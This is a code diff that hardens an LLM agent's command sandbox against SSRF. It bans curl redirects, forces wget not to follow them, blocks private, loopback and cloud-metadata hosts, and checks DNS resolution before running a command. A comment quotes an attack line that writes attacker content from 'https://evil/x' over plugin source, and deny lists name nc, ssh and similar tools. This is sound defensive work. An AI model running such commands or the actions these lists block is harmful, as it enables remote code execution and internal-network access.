@@ -1,10 +1,12 @@
 import fs from 'node:fs'
 import path from 'node:path'
+import net from 'node:net'
 import { execFile } from 'node:child_process'
 import { fileURLToPath } from 'node:url'
 import * as cfg from '../config/index.js'
 import * as llm from './llm.js'
 import * as securityLog from './securityLog.js'
+import { isPrivateIp, isAllowedOutboundUrl } from './security.js'
 import { safeLogger, sanitizeLog } from './globals.js'
 
 /**
@@ -424,7 +426,7 @@ function assertNoShellExpandTokens(cmd) {
 //   curl --output=../../src/agent.js https://evil/x         → 覆盖插件源码（重启后即 RCE）
 // curl 选项极多且大量选项可读写本地文件，故对"选项"改名单制为白名单：未列出的一律拒绝。
 const CURL_SAFE_OPTS = new Set([
-  '-s', '--silent', '-S', '--show-error', '-L', '--location', '-k', '--insecure',
+  '-s', '--silent', '-S', '--show-error', '-k', '--insecure',
   '-i', '--include', '-I', '--head', '-f', '--fail', '-v', '--verbose',
   '-X', '--request', '-H', '--header', '-A', '--user-agent', '-e', '--referer',
   '-u', '--user', '-G', '--get', '-g', '--globoff', '-q', '--disable',
@@ -445,9 +447,72 @@ const CURL_FORBIDDEN_OPTS = new Set([
   '-b', '--cookie', '-c', '--cookie-jar', '-w', '--write-out', '-D', '--dump-header',
   '--netrc-file', '--hsts', '--etag-save', '--etag-compare', '--libcurl',
   '--trace', '--trace-ascii', '--stderr',
+  // 禁止跟随重定向：重定向目标无法被 SSRF 校验，攻击者可用公网地址 302 到
+  // 127.0.0.1 / 169.254.169.254 等内网目标（curl 的 --proto-redir 只能限协议、不能限 IP）。
+  '-L', '--location',
 ])
-// 可合并书写的无值短选项（如 -sS / -sSL）；取值短选项（-o/-d/-T…）必须分开写
-const CURL_BUNDLE_LETTERS = new Set(['s', 'S', 'L', 'k', 'i', 'I', 'f', 'v', 'g', 'q', '4', '6'])
+// 可合并书写的无值短选项（如 -sS）；取值短选项（-o/-d/-T…）必须分开写。
+// 注意：不含 L（-L 跟随重定向已被禁用，防止经重定向跳到内网）
+const CURL_BUNDLE_LETTERS = new Set(['s', 'S', 'k', 'i', 'I', 'f', 'v', 'g', 'q', '4', '6'])
+
+// —— Agent 出站目标校验（同步快筛）——
+// curl/wget 只能访问公网 http/https，禁止内网/本机/链路本地/云元数据地址：
+//   - IP 字面量：127.0.0.1、10/172.16/192.168、169.254.169.254、[::1] 等 → isPrivateIp 拦截
+//   - 主机名：localhost / *.localhost / *.local / *.internal / *.home.arpa / *.lan / metadata
+// 域名解析到私网地址（DNS rebinding）由执行前的异步 assertAgentUrlsAllowed 兜底。
+const AGENT_BLOCKED_HOSTS = new Set(['localhost', 'metadata', 'instance-data'])
+const AGENT_BLOCKED_HOST_SUFFIXES = ['.localhost', '.local', '.internal', '.home.arpa', '.lan']
+
+function checkAgentUrlHost(rawUrl) {
+  let u
+  try { u = new URL(rawUrl) } catch (_) { return { ok: false, reason: `无法解析的 URL：${rawUrl}` } }
+  const scheme = u.protocol.replace(/:$/, '').toLowerCase()
+  if (scheme !== 'http' && scheme !== 'https') {
+    return { ok: false, reason: `curl/wget 仅允许 http/https 协议（${scheme}:// 可读取本地文件）` }
+  }
+  let host = u.hostname
+  if (host.startsWith('[') && host.endsWith(']')) host = host.slice(1, -1)
+  host = host.toLowerCase()
+  if (!host) return { ok: false, reason: 'URL 缺少主机名' }
+  if (AGENT_BLOCKED_HOSTS.has(host) || AGENT_BLOCKED_HOST_SUFFIXES.some((s) => host.endsWith(s))) {
+    return { ok: false, reason: `禁止访问内网/本机主机（SSRF 防护）：${host}` }
+  }
+  if (net.isIP(host) && isPrivateIp(host)) {
+    return { ok: false, reason: `禁止访问私有/回环/链路本地地址（SSRF 防护）：${host}` }
+  }
+  return { ok: true }
+}
+
+/** 提取 curl/wget 命令中所有显式 http(s) URL（兼容 --url= 内联形式） */
+function extractAgentUrls(cmd) {
+  const urls = []
+  for (const seg of splitSegments(cmd)) {
+    const c0 = firstCommand(seg)
+    if (c0 !== 'curl' && c0 !== 'wget') continue
+    for (const raw of tokenizeKeepQuoted(seg).slice(1)) {
+      for (const tk of expandLongOption(raw)) {
+        if (/^https?:\/\//i.test(tk)) urls.push(tk)
+      }
+    }
+  }
+  return urls
+}
+
+/**
+ * 执行前的异步出站校验：对命令中每个显式 URL 调用 isAllowedOutboundUrl，
+ * 拦截"域名解析到私网/回环/链路本地地址"（DNS rebinding）以及同步快筛未覆盖的形态。
+ * @param {Function} [checkFn] 可注入校验函数（测试用），默认 security.isAllowedOutboundUrl
+ * @returns {Promise<{ok:boolean, reason?:string}>}
+ */
+export async function assertAgentUrlsAllowed(cmd, checkFn = isAllowedOutboundUrl) {
+  for (const u of extractAgentUrls(cmd)) {
+    const r = await Promise.resolve(checkFn(u)).catch(() => ({ ok: false, reason: 'URL 校验失败' }))
+    if (!r || !r.ok) {
+      return { ok: false, reason: `Agent 网络访问被拒绝（${r?.reason || '目标不安全'}）：${u}` }
+    }
+  }
+  return { ok: true }
+}
 
 function assertSafeNetworkArgs(cmd) {
   const realRoot = workspaceRealRoot()
@@ -488,6 +553,13 @@ function assertSafeNetworkArgs(cmd) {
           if (inlineVal == null && tokens[i + 1] != null && !tokens[i + 1].startsWith('-')) i++ // 消费值 token
           continue
         }
+        if (opt === '--url') {
+          if (!nextVal) return { ok: false, reason: '--url 缺少 URL 参数' }
+          const r = checkAgentUrlHost(nextVal)
+          if (!r.ok) return r
+          if (inlineVal == null) i++ // 消费值 token
+          continue
+        }
         if (CURL_SAFE_OPTS.has(opt)) continue
         // 合并短选项：-sS / -sSL 等（全部字母均为无值短选项才放行）
         if (/^-[A-Za-z0-9]{2,}$/.test(opt) && [...opt.slice(1)].every((ch) => CURL_BUNDLE_LETTERS.has(ch))) continue
@@ -495,10 +567,8 @@ function assertSafeNetworkArgs(cmd) {
       }
       // 非选项 token：URL 或本地路径
       if (/^[a-z][a-z0-9+.-]*:\/\//i.test(raw)) {
-        const scheme = raw.slice(0, raw.indexOf(':')).toLowerCase()
-        if (scheme !== 'http' && scheme !== 'https') {
-          return { ok: false, reason: `curl/wget 仅允许 http/https 协议（${scheme}:// 可读取本地文件）` }
-        }
+        const r = checkAgentUrlHost(raw)
+        if (!r.ok) return r
         continue
       }
       const r = checkPathToken(raw, realRoot)
@@ -707,7 +777,7 @@ const WORKSPACE_FILES = {
 ## 可用命令
 - 文件与目录：ls cat head tail wc grep find sed awk sort uniq cut mkdir touch cp mv rm tar unzip zip diff file stat du
 - 开发工具：jq（node/python/npm 等解释器、git 默认禁用，如确需由管理员在 extraAllowedCommands 开启并自担风险）
-- 网络：curl wget（仅 http/https；不允许 @文件 形式与 file:// 协议）
+- 网络：curl wget（仅 http/https；不允许 @文件 形式与 file:// 协议；禁止访问内网/本机/元数据地址；禁止跟随重定向，若遇 3xx 请直接用最终 URL 重试）
 - 其他：echo printf pwd whoami date which ps free tree rg fd
 - 每次只能执行一条命令（禁止管道 / && / ; / 重定向）。命令不经过 /bin/sh，由 execFile 按参数数组执行。
 
@@ -798,19 +868,26 @@ export function buildAgentContext() {
     '命令执行结果会作为后续上下文返回，你可以根据结果继续操作，直到任务完成。',
     `单次任务最多执行 ${maxRounds} 轮命令，完成后输出最终成果总结。`,
     '支持 curl / wget / ls / cat / grep / find / sed / awk / mkdir / touch / cp / mv / rm（禁止 rm -rf）等常规命令（node/python 等解释器与 git 默认禁用；所有路径参数必须落在工作区内）。',
+    'curl/wget 仅可访问公网 http/https：禁止内网/本机/元数据地址，且不跟随重定向（遇 3xx 请直接用最终 URL 重试）。',
     '每次只能执行一条命令：禁止管道 / && / ; / 重定向；命令不经过 /bin/sh。',
     '禁止 sudo / shutdown / reboot / mkfs / mount / chown / ssh / scp / nc / chmod（除+x）/ 命令替换 / 写入系统目录等危险操作。禁止修改 AGENTS.md。'
   ].join('\n')
 }
 
 /** 执行单条命令（带超时、输出上限、固定工作目录）；内部强制安全校验（纵深防御） */
-export function runCommand(cmd, opts = {}) {
+export async function runCommand(cmd, opts = {}) {
+  // 即使调用方忘记先 checkCommand，这里也会拦截危险命令
+  const check = checkCommand(cmd)
+  if (!check.ok) {
+    return { ok: false, code: -1, costMs: 0, error: `命令被安全策略拒绝：${check.reason}`, detail: `命令被安全策略拒绝：${check.reason}` }
+  }
+  // 出站 URL 异步校验：拦截"域名解析到私网/回环/链路本地"（DNS rebinding）。
+  // 同步 checkCommand 已挡住 IP 字面量与 localhost/.local/.internal 形态。
+  const urlCheck = await assertAgentUrlsAllowed(cmd)
+  if (!urlCheck.ok) {
+    return { ok: false, code: -1, costMs: 0, error: urlCheck.reason, detail: urlCheck.reason }
+  }
   return new Promise((resolve) => {
-    // 即使调用方忘记先 checkCommand，这里也会拦截危险命令
-    const check = checkCommand(cmd)
-    if (!check.ok) {
-      return resolve({ ok: false, code: -1, costMs: 0, error: `命令被安全策略拒绝：${check.reason}`, detail: `命令被安全策略拒绝：${check.reason}` })
-    }
     const conf = cfg.get('agent', {}) || {}
     const timeout = Number(conf.commandTimeout) || DEFAULT_COMMAND_TIMEOUT
     const cwd = opts.cwd || WORKSPACE
@@ -833,6 +910,11 @@ export function runCommand(cmd, opts = {}) {
     const args = argv.slice(1)
     if (!bin) {
       return resolve({ ok: false, code: -1, costMs: 0, error: '命令为空', detail: '命令为空' })
+    }
+    // wget 默认跟随重定向，而重定向目标无法被 SSRF 校验（可 302 到内网）→
+    // 强制禁止跟随（curl 侧已禁用 -L）。追加在末尾，覆盖用户传入的 --max-redirect。
+    if (bin === 'wget') {
+      args.push('--max-redirect=0')
     }
     // 不经过 /bin/sh：execFile(bin, args) 按字面参数执行，消除 shell 展开/重定向/命令替换
     let abortedBySignal = false
